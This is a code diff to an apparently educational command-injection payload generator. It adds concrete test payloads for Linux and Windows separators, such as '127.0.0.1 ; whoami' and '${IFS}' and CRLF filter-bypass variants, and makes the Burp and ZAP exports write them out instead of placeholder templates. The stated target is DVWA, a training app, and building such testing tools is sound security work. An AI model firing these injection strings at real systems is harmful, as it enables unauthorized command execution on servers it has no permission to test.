@@ -28,7 +28,8 @@ from .cmdi_docs import get_filter_bypass_explanation, get_module_reference
 @dataclass
 class CMDIPattern:
     """Data class representing a single command injection pattern"""
-    pattern:          str
+    pattern:          str   # educational template with INPUT_VALUE / example_command
+    test_payload:     str   # ready-to-use payload for Burp/ZAP testing against DVWA
     os_type:          str   # linux | windows | both
     separator:        str   # the character used to chain commands
     description:      str
@@ -49,6 +50,7 @@ class CMDIPatternLibrary:
         return [
             CMDIPattern(
                 pattern="INPUT_VALUE ; example_command",
+                test_payload="127.0.0.1 ; whoami",
                 os_type="linux",
                 separator=";",
                 description="Semicolon separator — runs second command unconditionally",
@@ -60,6 +62,7 @@ class CMDIPatternLibrary:
             ),
             CMDIPattern(
                 pattern="INPUT_VALUE && example_command",
+                test_payload="127.0.0.1 && whoami",
                 os_type="linux",
                 separator="&&",
                 description="AND operator — runs second command only if first succeeds (exit 0)",
@@ -70,6 +73,7 @@ class CMDIPatternLibrary:
             ),
             CMDIPattern(
                 pattern="INPUT_VALUE || example_command",
+                test_payload="invalid_host || whoami",
                 os_type="linux",
                 separator="||",
                 description="OR operator — runs second command only if first fails (non-zero exit)",
@@ -80,6 +84,7 @@ class CMDIPatternLibrary:
             ),
             CMDIPattern(
                 pattern="INPUT_VALUE | example_command",
+                test_payload="127.0.0.1 | whoami",
                 os_type="linux",
                 separator="|",
                 description="Pipe — output of first command is stdin of second",
@@ -90,6 +95,7 @@ class CMDIPatternLibrary:
             ),
             CMDIPattern(
                 pattern="INPUT_VALUE `example_command`",
+                test_payload="127.0.0.1 `whoami`",
                 os_type="linux",
                 separator="`",
                 description="Backtick substitution — executes and substitutes command output inline",
@@ -100,6 +106,7 @@ class CMDIPatternLibrary:
             ),
             CMDIPattern(
                 pattern="INPUT_VALUE $(example_command)",
+                test_payload="127.0.0.1 $(whoami)",
                 os_type="linux",
                 separator="$(",
                 description="Dollar-paren substitution — POSIX alternative to backticks, nestable",
@@ -110,6 +117,7 @@ class CMDIPatternLibrary:
             ),
             CMDIPattern(
                 pattern="INPUT_VALUE%0Aexample_command",
+                test_payload="127.0.0.1%0Awhoami",
                 os_type="linux",
                 separator="%0A",
                 description="URL-encoded newline — shell interprets newline as command separator",
@@ -120,6 +128,7 @@ class CMDIPatternLibrary:
             ),
             CMDIPattern(
                 pattern="${IFS}example_command",
+                test_payload="127.0.0.1;${IFS}whoami",
                 os_type="linux",
                 separator="${IFS}",
                 description="Internal Field Separator abuse — replaces spaces to bypass space filters",
@@ -136,6 +145,7 @@ class CMDIPatternLibrary:
         return [
             CMDIPattern(
                 pattern="INPUT_VALUE & example_command",
+                test_payload="127.0.0.1 & whoami",
                 os_type="windows",
                 separator="&",
                 description="Windows ampersand — runs second command unconditionally (cmd.exe)",
@@ -146,6 +156,7 @@ class CMDIPatternLibrary:
             ),
             CMDIPattern(
                 pattern="INPUT_VALUE && example_command",
+                test_payload="127.0.0.1 && whoami",
                 os_type="windows",
                 separator="&&",
                 description="Windows AND — second command runs only if first succeeds",
@@ -156,6 +167,7 @@ class CMDIPatternLibrary:
             ),
             CMDIPattern(
                 pattern="INPUT_VALUE || example_command",
+                test_payload="invalid_host || whoami",
                 os_type="windows",
                 separator="||",
                 description="Windows OR — second command runs only if first fails",
@@ -166,6 +178,7 @@ class CMDIPatternLibrary:
             ),
             CMDIPattern(
                 pattern="INPUT_VALUE | example_command",
+                test_payload="127.0.0.1 | whoami",
                 os_type="windows",
                 separator="|",
                 description="Windows pipe — stdout of first becomes stdin of second",
@@ -176,6 +189,7 @@ class CMDIPatternLibrary:
             ),
             CMDIPattern(
                 pattern="INPUT_VALUE%0D%0Aexample_command",
+                test_payload="127.0.0.1%0D%0Awhoami",
                 os_type="windows",
                 separator="%0D%0A",
                 description="CRLF encoded newline — cmd.exe treats CR+LF as command delimiter",
@@ -186,6 +200,7 @@ class CMDIPatternLibrary:
             ),
             CMDIPattern(
                 pattern="INPUT_VALUE ^& example_command",
+                test_payload="127.0.0.1 ^& whoami",
                 os_type="windows",
                 separator="^&",
                 description="Caret-escaped ampersand — cmd.exe caret is an escape character",
@@ -288,7 +303,7 @@ class CMDIGenerator:
                     f.write(f"# {p.os_type.upper()} INJECTION PATTERNS\n")
                     f.write("# " + "="*76 + "\n")
                 f.write(f"# [Separator: {p.separator}] {p.description}\n")
-                f.write(f"{p.pattern}\n")
+                f.write(f"{p.test_payload}\n")
             f.write("\n")
         print(f"  ✅ Burp exported → {path}")
         print("     Import: Burp > Intruder > Payloads > Load")
@@ -326,7 +341,7 @@ class CMDIGenerator:
                     f.write(f"# {p.os_type.upper()} INJECTION PATTERNS\n")
                     f.write("# " + "="*76 + "\n")
                 f.write(f"# [Separator: {p.separator}] {p.description}\n")
-                f.write(f"{p.pattern}\n")
+                f.write(f"{p.test_payload}\n")
             f.write("\n")
         print(f"  ✅ ZAP exported  → {path}")
         print("     Import: ZAP > Fuzzer > Payloads > Add > File")
